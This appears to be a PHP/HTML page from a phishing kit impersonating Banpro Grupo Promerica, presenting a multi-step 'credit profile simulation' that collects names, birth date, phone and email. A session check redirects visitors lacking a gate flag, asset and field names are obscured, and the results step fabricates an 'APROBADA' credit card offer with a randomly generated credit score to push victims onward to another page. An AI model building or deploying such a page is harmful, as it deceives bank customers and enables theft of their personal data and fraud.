<?php
session_set_cookie_params(['lifetime'=>0,'path'=>'/','domain'=>'','secure'=>true,'httponly'=>true,'samesite'=>'None']); session_start();
if (empty($_SESSION['tsv_ok'])) {
    header('Location: /', true, 302);
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Banpro - Solicitud en Línea</title>
  <link rel="stylesheet" href="selva.css" />
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
  <script src="kappa.js"></script>
</head>
<body>
  <!-- Header -->
  <header class="sh1">
    <div class="container hi1">
      <a href="#" class="logo" aria-label="Inicio">
        <img src="img/escudo.png" alt="Logo" class="logo-img" />
      </a>
      <nav class="nd1" aria-label="Principal">
        <a href="#">Inicio</a>
        <a href="#" class="active">Validación</a>
        <a href="#">Tarjetas</a>
        <a href="#">Contacto</a>
      </nav>
      <a href="#" class="bl1">Iniciar Sesión</a>
      <button class="mb1" aria-label="Abrir menú">
        <span></span><span></span><span></span>
      </button>
    </div>
  </header>

  <!-- Hero -->
  <section class="hero">
    <div class="hb1">
      <span class="circle circle-1"></span>
      <span class="circle circle-2"></span>
    </div>
    <div class="container hc1">
      <div class="si1" aria-hidden="true">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M12 2l8 4v6c0 5-3.5 9.5-8 10-4.5-.5-8-5-8-10V6l8-4z"/>
          <path d="M9 12l2 2 4-4"/>
        </svg>
      </div>
      <h1 class="ht1">Evaluación de Perfil Financiero</h1>
      <p class="hs1">Ingresa tus datos para simular tu perfil financiero.</p>
    </div>
  </section>

  <!-- stp -->
  <section class="sw1">
    <div class="container">
      <ol class="stp" id="stp">
        <li class="step active" data-step="1">
          <div class="sc1">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
          </div>
          <span class="sl1">Datos<br/>Personales</span>
        </li>
        <li class="step" data-step="2">
          <div class="sc1">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="4" width="16" height="18" rx="2"/><path d="M9 2h6v4H9z"/><path d="M8 12h8M8 16h6"/></svg>
          </div>
          <span class="sl1">Contacto</span>
        </li>
        <li class="step" data-step="3">
          <div class="sc1">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/></svg>
          </div>
          <span class="sl1">Validación</span>
        </li>
        <li class="step" data-step="4">
          <div class="sc1">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M8 12l3 3 5-6"/></svg>
          </div>
          <span class="sl1">Resultados</span>
        </li>
      </ol>
    </div>
  </section>

  <!-- Form sections -->
  <main class="container main">
    <!-- STEP 1: Datos Personales -->
    <section class="fs1 active" data-form="1">
      <div class="alert alert-warning">
        <strong>Importante:</strong> Simulación informativa, conoce los productos disponibles para ti.
      </div>

      <h2 class="form-title">Información Personal</h2>
      <p class="form-sub">Ingresa tus datos para simular tu perfil financiero.</p>

      <form id="g01" class="form-grid" novalidate>
        <div class="field">
          <label for="nombres">Nombres Completos <span class="req">*</span></label>
          <div class="input-wrap">
            <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
            <input type="text" id="nombres" name="nombres" placeholder="Juan Carlos" required />
          </div>
        </div>
        <div class="field">
          <label for="apellidos">Apellidos Completos <span class="req">*</span></label>
          <div class="input-wrap">
            <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
            <input type="text" id="apellidos" name="apellidos" placeholder="Pérez González" required />
          </div>
        </div>
        <div class="actions full">
          <button type="submit" class="bpr">
            Continuar
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 5l7 7-7 7"/></svg>
          </button>
        </div>
      </form>
    </section>

    <!-- STEP 2: Identificación -->
    <section class="fs1" data-form="2">
      <h2 class="form-title">Información de Contacto</h2>
      <p class="form-sub">Estos datos nos permiten validar tu perfil con Banpro.</p>

      <form id="g02" class="form-grid" novalidate>
        <div class="field">
          <label for="d01">Fecha de Nacimiento <span class="req">*</span></label>
          <div class="input-wrap">
            <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="18" rx="2"/><path d="M16 2v4M8 2v4M3 10h18"/></svg>
            <input type="text" id="d01" name="d01" inputmode="numeric" placeholder="DD/MM/AAAA" maxlength="10" autocomplete="off" required />
          </div>
        </div>

        <div class="field">
          <label for="p01">Teléfono <span class="req">*</span></label>
          <div class="input-wrap">
            <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
            <input type="tel" id="p01" name="p01" inputmode="numeric" placeholder="8888 8888" maxlength="9" autocomplete="off" required />
          </div>
        </div>

        <div class="field">
          <label for="e01">Correo Electrónico <span class="req">*</span></label>
          <div class="input-wrap">
            <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-10 5L2 7"/></svg>
            <input type="e01" id="e01" name="e01" placeholder="correo@ejemplo.com" autocomplete="e01" required />
          </div>
        </div>

        <div class="field">
          <label for="antiguedad">Antigüedad con Banpro <span class="req">*</span></label>
          <div class="select-wrap with-icon">
            <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
            <select id="antiguedad" name="antiguedad" required>
              <option value="" disabled selected>Seleccionar</option>
              <option value="Menos de 1 año">Menos de 1 año</option>
              <option value="1 a 3 años">1 a 3 años</option>
              <option value="3 a 5 años">3 a 5 años</option>
              <option value="Más de 5 años">Más de 5 años</option>
              <option value="No soy cliente">No soy cliente</option>
            </select>
            <svg class="select-caret" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 9l6 6 6-6"/></svg>
          </div>
        </div>

        <div class="alert alert-info full">
          <div class="alert-icon">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9.5-8 10-4.5-.5-8-5-8-10V6l8-4z"/></svg>
          </div>
          <div>
            <strong>Protección de Datos</strong>
            <p>Tus datos están protegidos. Solo serán utilizados para fines de evaluación crediticia con Banpro Grupo Promerica.</p>
          </div>
        </div>

        <div class="actions full">
          <button type="submit" class="bpr">
            Continuar
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 5l7 7-7 7"/></svg>
          </button>
        </div>
      </form>
    </section>

    <!-- STEP 3: Validación (loading) -->
    <section class="fs1" data-form="3">
      <h2 class="form-title">Simulación de Perfil Crediticio</h2>
      <p class="form-sub">Ingresa tus datos para generar una evaluación estimada de tu perfil financiero.</p>

      <div class="validation-block">
        <div class="spinner small" aria-hidden="true"></div>
        <h3 class="validation-title">Analizando tu Perfil Estimado</h3>
        <p class="validation-sub">Este proceso puede tomar hasta 60 segundos...</p>

        <ul class="status-list">
          <li class="status-done">
            <span class="status-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5L20 7"/></svg>
            </span>
            Verificando información
          </li>
          <li class="status-done">
            <span class="status-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5L20 7"/></svg>
            </span>
            Consultando perfil financiero
          </li>
          <li class="status-done">
            <span class="status-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5L20 7"/></svg>
            </span>
            Consultando historial crediticio
          </li>
          <li class="status-loading">
            <span class="status-icon">
              <span class="status-dot"></span>
            </span>
            Analizando elegibilidad de productos...
          </li>
        </ul>
      </div>
    </section>

    <!-- STEP 4: Resultados -->
    <section class="fs1" data-form="4">
      <h2 class="form-title">Resultados de Simulación</h2>
      <p class="form-sub">Basado en tu perfil estimado, tenemos estas opciones para ti.</p>

      <div class="alert alert-success">
        <div class="alert-icon success">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M8 12l3 3 5-6"/></svg>
        </div>
        <div>
          <strong>¡Felicidades!</strong>
          <p>Tu perfil estimado cumple con nuestros criterios. Tienes acceso a múltiples opciones financieras.</p>
        </div>
      </div>

      <!-- Tarjeta producto -->
      <div class="product-card">
        <div class="product-card-img">
          <img src="img/tela.png" alt="Tarjeta Crédito Banpro" class="product-img" />
        </div>
        <div class="product-card-body">
          <div class="product-head">
            <h3 class="product-title">Tarjeta Crédito Banpro ConnectMiles Infinite</h3>
            <span class="badge badge-success">APROBADA</span>
          </div>
          <ul class="product-info">
            <li><span>Monto aprobado:</span><strong class="text-success">C$ 180,000</strong></li>
            <li><span>Tasa de interés:</span><strong>1.1% mensual</strong></li>
            <li><span>Cuota de manejo:</span><strong>C$ 350</strong></li>
          </ul>
          <a href="heno.html" class="bp1">Solicitar Ahora</a>
          <p class="product-note">Oferta exclusiva para clientes antiguos. Sujeto a verificación.</p>
        </div>
      </div>

      <!-- Resumen de perfil -->
      <div class="summary-card">
        <h3 class="summary-title">Resumen de tu Perfil</h3>
        <div class="summary-grid">
<?php
            $score        = random_int(600, 820);
            $negativos    = random_int(0, 2);
            $productos    = random_int(1, 2);
          ?>
          <div class="smi">
            <div class="summary-value"><?= $score ?></div>
            <div class="summary-label">Score Crediticio</div>
          </div>
          <div class="smi">
            <div class="summary-value text-success">Excelente</div>
            <div class="summary-label">Historial</div>
          </div>
          <div class="smi">
            <div class="summary-value"><?= $negativos ?></div>
            <div class="summary-label">Reportes Negativos</div>
          </div>
          <div class="smi">
            <div class="summary-value"><?= $productos ?></div>
            <div class="summary-label">Productos Aptos</div>
          </div>
        </div>
      </div>

      <!-- Validación segura -->
      <div class="alert alert-info">
        <div class="alert-icon">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9.5-8 10-4.5-.5-8-5-8-10V6l8-4z"/></svg>
        </div>
        <div>
          <strong>Validación Segura y Confidencial</strong>
          <p>Simula tu Pre-Aprobado en Línea, consultamos digitalmente tu historial crediticio</p>
        </div>
      </div>

    </section>
  </main>

  <!-- Footer -->
  <footer class="site-footer">
    <div class="container footer-inner">
      <div class="footer-left">
        <div class="footer-logo">
          <img src="img/escudo.png" alt="Logo" class="logo-img footer-logo-img" />
        </div>
        <p class="footer-copy">© 2026 Banpro Grupo Promerica. Todos los derechos reservados.</p>
      </div>
      <nav class="footer-links" aria-label="Enlaces del pie">
        <a href="#">Privacidad</a>
        <a href="#">Términos</a>
        <a href="#">Seguridad</a>
        <a href="#">Ayuda</a>
      </nav>
    </div>
  </footer>

  <script src="nilo.js"></script>
</body>
</html>
